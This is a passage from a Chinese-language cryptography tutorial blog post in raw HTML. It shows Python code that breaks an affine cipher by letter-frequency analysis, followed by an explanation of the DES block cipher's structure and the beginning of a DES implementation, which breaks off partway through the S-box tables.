class=\"string\">\"Plz input cipher: \"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 频率统计</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cipher)):</span><br><span class=\"line\">\tt = ord(cipher[i])-ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\tfreq[t] += <span class=\"number\">1</span>\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_ab</span><span class=\"params\">(x,y)</span>:</span></span><br><span class=\"line\">\tdic = [<span class=\"string\">'e'</span>,<span class=\"string\">'t'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'i'</span>,<span class=\"string\">'n'</span>,<span class=\"string\">'s'</span>,<span class=\"string\">'h'</span>,<span class=\"string\">'r'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'l'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'u'</span>,<span class=\"string\">'m'</span>,<span class=\"string\">'w'</span>,<span class=\"string\">'f'</span>,<span class=\"string\">'g'</span>,<span class=\"string\">'y'</span>,<span class=\"string\">'p'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'v'</span>,<span class=\"string\">'k'</span>,<span class=\"string\">'j'</span>,<span class=\"string\">'x'</span>,<span class=\"string\">'q'</span>,<span class=\"string\">'z'</span>]</span><br><span class=\"line\">\trepeat = []   <span class=\"comment\"># 去除重复计算的项</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> one <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> two <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">\t\t\to = ord(one) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\t\tt = ord(two) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\t\too = ord(x) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\t\ttt = ord(y) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># oo = a*o+b</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># tt = a*t+b</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> o - t == <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\ta = ((oo-tt)//(o-t)) % <span class=\"number\">26</span></span><br><span class=\"line\">\t\t\tb = (oo - a * o) % <span class=\"number\">26</span></span><br><span class=\"line\">\t\t\ttest =  int(gmpy2.gcd(a, <span class=\"number\">26</span>))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> test != <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\t_a = gmpy2.invert(a, <span class=\"number\">26</span>)</span><br><span class=\"line\">\t\t\tplain = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (a,b) <span class=\"keyword\">in</span> repeat:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">\t\t\t\tex = ord(item) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\t\t\tp = (_a * (ex - b)) % <span class=\"number\">26</span></span><br><span class=\"line\">\t\t\t\tplain += chr(p+ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">\t\t\trepeat.append((a,b))</span><br><span class=\"line\">\t\t\tprint(plain,end=<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">\"**\"</span> + str(a) + <span class=\"string\">\"**\"</span> + str(b))</span><br><span class=\"line\">\tprint(<span class=\"string\">\"共\"</span> + str(len(repeat)) + <span class=\"string\">\"项.\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">x = chr(freq.index(max(freq)) + ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">freq[freq.index(max(freq))] = <span class=\"number\">0</span></span><br><span class=\"line\">y = chr(freq.index(max(freq)) + ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">get_ab(x,y)</span><br></pre></td></tr></table></figure>\n<p>代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。</p>\n<p><img src=\"/2019/01/15/crypto1/3.png\" alt=\"demo\"></p>\n<p>可以看到密文被成功破解</p>\n<hr>\n<p>　　从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。</p>\n<h1 id=\"分组密码\"><a href=\"#分组密码\" class=\"headerlink\" title=\"分组密码\"></a>分组密码</h1><h2 id=\"DES加密算法\"><a href=\"#DES加密算法\" class=\"headerlink\" title=\"DES加密算法\"></a>DES加密算法</h2><p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 </p>\n<p>DES加密流程如下图</p>\n<p><img src=\"/2019/01/15/crypto1/5.png\" alt=\"demo\"></p>\n<p>解密时只需要将机密流程逆序即可。</p>\n<p>算法大致步骤如下：</p>\n<ol>\n<li>初始置换</li>\n</ol>\n<p>​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。</p>\n<hr>\n<p>下一步是进行轮函数（F函数）迭代，F函数具体步骤如下</p>\n<ol>\n<li>扩展置换（E盒）</li>\n</ol>\n<p>初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。</p>\n<p>该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。</p>\n<ol>\n<li>秘钥加运算</li>\n</ol>\n<p>该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。</p>\n<ol>\n<li>代换盒（S盒）</li>\n</ol>\n<p>此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。</p>\n<p>代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果</p>\n<p>S盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。</p>\n<ol>\n<li>置换运算（P盒）</li>\n</ol>\n<p>置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。</p>\n<p>至此<strong>F函数</strong>结束</p>\n<hr>\n<ol>\n<li>逆置换</li>\n</ol>\n<p>将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为<strong>F函数</strong>。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。</p>\n<p><em>代码如下：</em></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">ip = [<span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, </span><br><span class=\"line\"><span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>, <span class=\"number\">13</span>, <span class=\"number\">5</span>, <span class=\"number\">63</span>, <span class=\"number\">55</span>, <span class=\"number\">47</span>, <span class=\"number\">39</span>, <span class=\"number\">31</span>, <span class=\"number\">23</span>,</span><br><span class=\"line\"><span class=\"number\">15</span>, <span class=\"number\">7</span>, <span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>, <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>, <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>, <span class=\"number\">60</span>, </span><br><span class=\"line\"><span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 逆矩阵</span></span><br><span class=\"line\">_ip = [<span class=\"number\">39</span>, <span class=\"number\">7</span>, <span class=\"number\">47</span>, <span class=\"number\">15</span>, <span class=\"number\">55</span>, <span class=\"number\">23</span>, <span class=\"number\">63</span>, <span class=\"number\">31</span>, <span class=\"number\">38</span>, <span class=\"number\">6</span>, <span class=\"number\">46</span>, <span class=\"number\">14</span>, <span class=\"number\">54</span>, <span class=\"number\">22</span>, </span><br><span class=\"line\"><span class=\"number\">62</span>, <span class=\"number\">30</span>, <span class=\"number\">37</span>, <span class=\"number\">5</span>, <span class=\"number\">45</span>, <span class=\"number\">13</span>, <span class=\"number\">53</span>, <span class=\"number\">21</span>, <span class=\"number\">61</span>, <span class=\"number\">29</span>, <span class=\"number\">36</span>, <span class=\"number\">4</span>, <span class=\"number\">44</span>, <span class=\"number\">12</span>, <span class=\"number\">52</span>, <span class=\"number\">20</span>, </span><br><span class=\"line\"><span class=\"number\">60</span>, <span class=\"number\">28</span>, <span class=\"number\">35</span>, <span class=\"number\">3</span>, <span class=\"number\">43</span>, <span class=\"number\">11</span>, <span class=\"number\">51</span>, <span class=\"number\">19</span>, <span class=\"number\">59</span>, <span class=\"number\">27</span>, <span class=\"number\">34</span>, <span class=\"number\">2</span>, <span class=\"number\">42</span>, <span class=\"number\">10</span>, <span class=\"number\">50</span>, <span class=\"number\">18</span>, </span><br><span class=\"line\"><span class=\"number\">58</span>, <span class=\"number\">26</span>, <span class=\"number\">33</span>, <span class=\"number\">1</span>, <span class=\"number\">41</span>, <span class=\"number\">9</span>, <span class=\"number\">49</span>, <span class=\"number\">17</span>, <span class=\"number\">57</span>, <span class=\"number\">25</span>, <span class=\"number\">32</span>, <span class=\"number\">0</span>, <span class=\"number\">40</span>, <span class=\"number\">8</span>, <span class=\"number\">48</span>, <span class=\"number\">16</span>, <span class=\"number\">56</span>, <span class=\"number\">24</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化c、d数组</span></span><br><span class=\"line\">c = [<span class=\"string\">\"\"</span>]*<span class=\"number\">17</span></span><br><span class=\"line\">d = [<span class=\"string\">\"\"</span>]*<span class=\"number\">17</span></span><br><span class=\"line\">k = [<span class=\"string\">\"\"</span>]*<span class=\"number\">17</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 左右32位数组</span></span><br><span class=\"line\">l = [<span class=\"string\">\"\"</span>]*<span class=\"number\">17</span></span><br><span class=\"line\">r = [<span class=\"string\">\"\"</span>]*<span class=\"number\">17</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">generate_secretkey</span><span class=\"params\">(key, round)</span>:</span></span><br><span class=\"line\">\tpc1 = [<span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>, <span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>, <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>, <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>, <span class=\"number\">62</span>, <span class=\"number\">54</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>, <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>, <span class=\"number\">13</span>, <span class=\"number\">5</span>, <span class=\"number\">60</span>, <span class=\"number\">52</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">4</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">\trespc1 = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">56</span>):</span><br><span class=\"line\">\t\trespc1 += key[pc1[i]]</span><br><span class=\"line\">\tc[<span class=\"number\">0</span>] = respc1[:<span class=\"number\">28</span>]</span><br><span class=\"line\">\td[<span class=\"number\">0</span>] = respc1[<span class=\"number\">28</span>:]</span><br><span class=\"line\">\tk[<span class=\"number\">0</span>] = c[<span class=\"number\">0</span>] + d[<span class=\"number\">0</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,round+<span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> (<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 左移1位</span></span><br><span class=\"line\">\t\t\tc[i] = c[i<span class=\"number\">-1</span>][<span class=\"number\">1</span>:] + c[i<span class=\"number\">-1</span>][:<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\t\td[i] = d[i<span class=\"number\">-1</span>][<span class=\"number\">1</span>:] + d[i<span class=\"number\">-1</span>][:<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tc[i] = c[i<span class=\"number\">-1</span>][<span class=\"number\">2</span>:] + c[i<span class=\"number\">-1</span>][:<span class=\"number\">2</span>]</span><br><span class=\"line\">\t\t\td[i] = d[i<span class=\"number\">-1</span>][<span class=\"number\">2</span>:] + d[i<span class=\"number\">-1</span>][:<span class=\"number\">2</span>]</span><br><span class=\"line\">\tsecret = c[round] + d[round]</span><br><span class=\"line\">\tpc2 = [<span class=\"number\">14</span>,<span class=\"number\">17</span>,<span class=\"number\">11</span>,<span class=\"number\">24</span>,<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>,<span class=\"number\">28</span>,<span class=\"number\">15</span>,<span class=\"number\">6</span>,<span class=\"number\">21</span>,<span class=\"number\">10</span>,<span class=\"number\">23</span>,<span class=\"number\">19</span>,<span class=\"number\">12</span>,<span class=\"number\">4</span>,<span class=\"number\">26</span>,<span class=\"number\">8</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">16</span>,<span class=\"number\">7</span>,<span class=\"number\">27</span>,<span class=\"number\">20</span>,<span class=\"number\">13</span>,<span class=\"number\">2</span>,<span class=\"number\">41</span>,<span class=\"number\">52</span>,<span class=\"number\">31</span>,<span class=\"number\">37</span>,<span class=\"number\">47</span>,<span class=\"number\">55</span>,<span class=\"number\">30</span>,<span class=\"number\">40</span>,<span class=\"number\">51</span>,<span class=\"number\">45</span>,<span class=\"number\">33</span>,<span class=\"number\">48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">44</span>,<span class=\"number\">49</span>,<span class=\"number\">39</span>,<span class=\"number\">56</span>,<span class=\"number\">34</span>,<span class=\"number\">53</span>,<span class=\"number\">46</span>,<span class=\"number\">42</span>,<span class=\"number\">50</span>,<span class=\"number\">36</span>,<span class=\"number\">29</span>,<span class=\"number\">32</span>]</span><br><span class=\"line\">\ts_key = <span class=\"string\">\"\"</span> <span class=\"comment\"># 生成本轮最终秘钥</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">48</span>):</span><br><span class=\"line\">\t\ts_key += secret[pc2[i]<span class=\"number\">-1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s_key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始置换，输入为64位数据，8个ascii字符</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_replace</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">\tre = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">64</span>):</span><br><span class=\"line\">\t\tre += data[ip[i]]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 扩展置换，输入为32位数据，输出为48位数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">e_replace</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">\te_box = [<span class=\"number\">31</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">25</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">\tre = [<span class=\"string\">'a'</span>] * <span class=\"number\">48</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">48</span>):</span><br><span class=\"line\">\t\tre[i] = data[e_box[i]]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 秘钥加处理</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">secret_plus</span><span class=\"params\">(data, key)</span>:</span></span><br><span class=\"line\">\tout = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">48</span>):</span><br><span class=\"line\">\t\tout += str(int(data[i])^int(key[i]))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># s盒置换，输入48位，输出32位</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">s_replace</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">\ts1 = [[<span class=\"number\">14</span>,<span class=\"number\">4</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">15</span>,<span class=\"number\">11</span>,<span class=\"number\">8</span>,<span class=\"number\">3</span>,<span class=\"number\">10</span>,<span class=\"number\">6</span>,<span class=\"number\">12</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">7</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">0</span>,<span class=\"number\">15</span>,<span class=\"number\">7</span>,<span class=\"number\">4</span>,<span class=\"number\">14</span>,<span class=\"number\">2</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">6</span>,<span class=\"number\">12</span>,<span class=\"number\">11</span>,<span class=\"number\">9</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>,<span class=\"number\">8</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">11</span>,<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">9</span>,<span class=\"number\">7</span>,<span class=\"number\">3</span>,<span class=\"number\">10</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">8</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"number\">7</span>,<span class=\"number\">5</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">14</span>,<span class=\"number\">10</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">13</span>]]</span><br><span class=\"line\">\ts2 = [[<span class=\"number\">15</span>,<span class=\"number\">1</span>,<span class=\"number\">8</span>,<span class=\"number\">14</span>,<span class=\"number\">6</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">13</span>,<span class=\"number\">12</span>,<span class=\"number\">0</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">3</span>,<span class=\"number\">13</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>,<span class=\"number\">15</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>,<span class=\"number\">14</span>,<span class=\"number\">12</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">11</span>,<span class=\"number\">5</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">0</span>,<span class=\"number\">14</span>,<span class=\"number\">7</span>,<span class=\"number\">11</span>,<span class=\"number\">10</span>,<span class=\"number\">4</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">12</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">15</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">10</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">15</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">11</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">12</span>,<span class=\"number\">0</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">9</span>]]</span><br><span class=\"line\">\ts3 = [[<span class=\"number\">10</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">14</span>,<span class=\"number\">6</span>,<span class=\"number\">3</span>,<span class=\"number\">15</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">13</span>,<span class=\"number\">12</span>,<span class=\"number\">7</span>,<span class=\"number\">11</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">13</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">10</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">12</span>,<span class=\"number\">11</span>,<span class=\"number\">15</span>,<span class=\"number\">1</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">13</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">15</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"number\">11</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">14</span>,<span class=\"number\">7</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">7</span>,<span class=\"number\">4</span>,<span class=\"number\">15</span>,<span class=\"number\">14</span>,<span class=\"number\">3</span>,<span class=\"number\">11</span>,<span class=\"number\">5</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>]]</span><br><span class=\"line\">\ts4 = [[<span class=\"number\">7</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">4</span>,<span class=\"number\">15</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">11</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">15</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">14</span>,<span class=\"number\">9</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">10</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">12</span>,<span class=\"number\">11</span>,<span class=\"number\">7</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">14</span>,<span class=\"number\">5</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">3</span>,<span class=\"number\">15</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">10</span>,<span class=\"number\">1</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">14</span>]]</span><br><span class=\"line\">\ts5 = [[<span class=\"number\">2</span>,<span class=\"number\">12</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"number\">7</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>,<span class=\"number\">15</span>,<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">14</span>,<span 